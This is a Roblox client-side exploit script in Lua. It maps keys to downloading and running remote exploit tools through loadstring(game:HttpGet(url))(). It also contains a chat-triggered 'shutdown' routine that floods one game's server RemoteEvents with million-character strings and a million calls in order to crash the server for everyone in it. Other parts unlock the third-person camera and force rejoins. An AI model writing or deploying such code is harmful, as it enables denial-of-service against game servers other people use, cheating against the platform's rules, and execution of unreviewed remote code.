```lua
if not game:IsLoaded() then
	game.Loaded:Wait()
end

local pls = game:GetService("Players")
local uis = game:GetService("UserInputService")
local tp = game:GetService("TeleportService")
local rs = game:GetService("ReplicatedStorage")
local tcs = game:GetService("TextChatService")

local lp = pls.LocalPlayer

local scripts = {
	[Enum.KeyCode.Insert] = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
	[Enum.KeyCode.Delete] = "https://github.com/AZYsGithub/DexPlusPlus/releases/latest/download/out.lua",
	[Enum.KeyCode.Home] = "https://gitlab.com/upio/cobalt/-/releases/permalink/latest/downloads/Cobalt.luau",
}

function rejoin()
	tp:TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)

	while task.wait(0.1) do
		tp:Teleport(game.PlaceId, lp)
	end
end

function thirdperson()
	lp.CameraMode = Enum.CameraMode.Classic
	lp.CameraMinZoomDistance = 10
	lp.CameraMaxZoomDistance = 1000

	task.wait()

	lp.CameraMinZoomDistance = 0
end

function shutdown()
	tcs.TextChannels.RBXGeneral:SendAsync("Shutting down server...")

	lp.PlayerGui:Destroy()
	lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)

	task.wait(0.1)

	local events = rs.DataEvents

	events.UpdateTexturesChoice:FireServer(("a"):rep(1e6))
	events.UpdateLineColorsEvent:FireServer(("a"):rep(1e6))

	task.wait(0.1)
	for i = 1, 1e6 do
		events.DataRemoteEvent:FireServer()
	end
end

uis.InputBegan:Connect(function(input, processed)
	if processed then return end

	local url = scripts[input.KeyCode]

	if url then
		loadstring(game:HttpGet(url))()
	elseif input.KeyCode == Enum.KeyCode.End then
		thirdperson()
	end
end)

lp.Chatted:Connect(function(message)
	if message == "rj" then
		rejoin()
	elseif message == "/shutdown" and game.PlaceId == 6961824067 then
		shutdown()
	end
end)
```
